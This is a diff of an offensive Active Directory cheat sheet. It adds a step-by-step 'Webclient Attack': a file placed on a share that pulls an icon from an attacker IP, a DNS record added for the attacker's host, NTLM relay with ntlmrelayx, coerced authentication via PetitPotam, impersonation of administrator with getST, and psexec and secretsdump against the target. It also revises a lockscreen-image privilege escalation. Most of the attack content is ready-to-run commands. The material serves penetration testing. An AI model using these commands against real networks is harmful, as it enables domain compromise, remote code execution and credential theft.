@@ -626,8 +626,10 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt"'
   − Two, Write permissions over the target service or object to configure msDS-AllowedToActOnBehalfOfOtherIdentity.  
 
 ### Computer object takeover
+- Requirements:
+  - An account with a SPN associated (Can use a computer domain account and set SPN)
+  - A user with write privileges over the target computer which doesn't have msds-AllowedToActOnBehalfOfOtherIdentity
 - https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution
-
 
 #### Check if domain controller is atleast Windows Server 2012
 ```
@@ -718,11 +720,98 @@ If the dir doesn't work read the blogpost! That might tell you why! (Didn't test
 
 #### It is possible that you impersonated another user which leads to more ACL abuses!
 
+### Webclient Attack
+- Requirements:
+  - On a Domain Controller to have the LDAP server signing not enforced (default value)
+  - On a Domain Controller to have the LDAPS channel binding not required (default value)
+  - Able to add new machines accounts (default value this quota is 10)
+  - On the network, machines with WebClient running (some OS version had this service running by default or use the webclient starting trick from DTMSecurity)
+  - A DNS record pointing to the attacker’s machine (By default authenticated users can do this)
+- https://www.bussink.net/rbcd-webclient-attack/
+
+#### Check who can add computers to the domain
+```
+(Get-DomainPolicy -Policy DC).PrivilegeRights.SeMachineAccountPrivilege.Trim("*") | Get-DomainObject | Select-Object name
+
+Get-DomainObject | Where-Object ms-ds-machineaccountquota
+
+cme ldap <DC IP> -d <DOMAIN> -u <USER> -p <PASS> -M maq
+```
+
+#### Check LDAP Signing and LDAPS Binding
+- https://github.com/zyn3rgy/LdapRelayScan
+```
+python3 LdapRelayScan.py -method BOTH -dc-ip <IP> -u <USER> -p <PASSWORD>
+```
+
+#### Scan for target with webclient active
+- https://github.com/Hackndo/WebclientServiceScanner
+```
+webclientservicescanner <DOMAIN>/<USER>:<PASSWORD>@<IP RANGE> -dc-ip <DC IP>
+```
+
+#### If no targets, place file on share to activate webclients
+- https://www.bussink.net/webclient_activation/
+- Filename ```Documents.searchConnector-ms```
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
+    <iconReference>imageres.dll,-1002</iconReference>
+    <description>Microsoft Outlook</description>
+    <isSearchOnlyItem>false</isSearchOnlyItem>
+    <includeInStartMenuScope>true</includeInStartMenuScope>
+    <iconReference>https://<ATTACKER IP>/0001.ico</iconReference>
+    <templateInfo>
+        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
+    </templateInfo>
+    <simpleLocation>
+        <url>https://www.bussink.net/</url>
+    </simpleLocation>
+</searchConnectorDescription>
+```
+
+#### Create a DNS record pointing to the attacker's machine IP
+- https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py
+- https://github.com/Kevin-Robertson/Powermad/blob/master/Invoke-DNSUpdate.ps1
+```
+dnstool.py -u <DOMAIN>\<USER> -a add -r <HOSTNAME> -d <ATTACKER IP> <DC IP>
+
+$creds = get-credential
+Invoke-DNSUpdate -DNSType A -DNSName <HOSTNAME> -DNSData <IP ATTACKING MACHINE> -Credential $creds -Realm <DOMAIN>
+```
+- Didn't test powershell invoke-dnsupdate for this attack
+
+#### start NTLMRelay
+```
+sudo ntlmrelayx.py -t ldaps://<DC IP> --http-port 8080 --delegate-access 
+```
+
+#### Trigget target to authenticate to attacker machine
+- Use hostname we created in the DNS record
+```
+python3 PetitPotam.py -d <DOMAIN> -u <USER> -p <PASSWORD> <HOSTNAME ATTACKER MACHINE>@8080/a <TARGET>
+```
+
+#### Check for user to impersonate
+- Preferably a user that would be admin on the machine (Check BloodHound). Maybe another command to check if user is admin on a machine? Is that possible? We should check!
+- User should not be part of "Protected Users group" or accounts with the "This account is sensitive and cannot be delegated" right
+```
+Get-DomainUser | ? {!($_.memberof -Match "Protected Users")} | select samaccountname, memberof
+```
+
+#### Impersonate any user and exploit
+- Impersonate any user except those in groups "Protected Users" or accounts with the "This account is sensitive and cannot be delegated" right
+```
+getST.py <DOMAIN>/<MACHINE ACCOUNT>@<TARGET FQDN> -spn cifs/<TARGET FQDN> -impersonate administrator -dc-ip <DC IP>
+Export KRB5CCNAME=administrator.ccache
+python3 Psexec.py -k -no-pass <TARGET FQDN>
+python3 Secretsdump.py -k <TARGET FQDN>
+```
 
 ### Image Change Privilege Escalation
-- Privescs on local machine
 - Requirements:
-  - An account with a SPN associated (Can use a computer domain account and set SPN)
+  - Low priv shell on a machine
+  - An account with a SPN associated (or able to add new machines accounts (default value this quota is 10))
   - WebDAV Redirector feature must be installed on the victim machine. (W10 has it by default, but manually installed on server 2016 and later)
   - A DNS record pointing to the attacker’s machine (By default authenticated users can do this)
   - Access to the GUI in order to use the “Create your picture –> Browse for one” functionality. 
@@ -733,6 +822,8 @@ If the dir doesn't work read the blogpost! That might tell you why! (Didn't test
 (Get-DomainPolicy -Policy DC).PrivilegeRights.SeMachineAccountPrivilege.Trim("*") | Get-DomainObject | Select-Object name
 
 Get-DomainObject | Where-Object ms-ds-machineaccountquota
+
+cme ldap <DC IP> -d <DOMAIN> -u <USER> -p <PASS> -M maq
 ```
 
 #### Create a new computer object
@@ -747,18 +838,29 @@ New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '12
 - https://github.com/Kevin-Robertson/Powermad/blob/master/Invoke-DNSUpdate.ps1
 ```
 $creds = get-credential
-Invoke-DNSUpdate -DNSType A -DNSName attacker.<DOMAIN> -DNSData <IP ATTACKING MACHINE> -Credential $creds -Realm <DOMAIN>
+Invoke-DNSUpdate -DNSType A -DNSName webdav.<DOMAIN> -DNSData <IP ATTACKING MACHINE> -Credential $creds -Realm <DOMAIN>
 ```
+
+#### Create a DNS record pointing to the attacker's machine IP
+- https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py
+- https://github.com/Kevin-Robertson/Powermad/blob/master/Invoke-DNSUpdate.ps1
+```
+dnstool.py -u <DOMAIN>\<USER> -a add -r webdav.<DOMAIN> -d <ATTACKER IP> <DC IP>
+
+$creds = get-credential
+Invoke-DNSUpdate -DNSType A -DNSName webdav.<DOMAIN> -DNSData <IP ATTACKING MACHINE> -Credential $creds -Realm <DOMAIN>
+```
+- Didn't test dnstool for this attack
 
 #### Serve image with impacket
 ```
-ntlmrelayx.py -t ldap://<DC FQDN> --delegate-access -escalate-user FAKE01$ --serve-image ./image.jpg
+sudo python3 ntlmrelayx.py -t ldap://<DC FQDN> --delegate-access --escalate-user FAKE01$ --serve-image ./image.jpg
 ```
 
 #### Change lockscreen image
 - https://github.com/nccgroup/Change-Lockscreen
 ```
-change-lockscreen --webdav \\atacker@80\
+change-lockscreen --webdav \\webdav@80\
 ```
 
 #### Impersonate any user
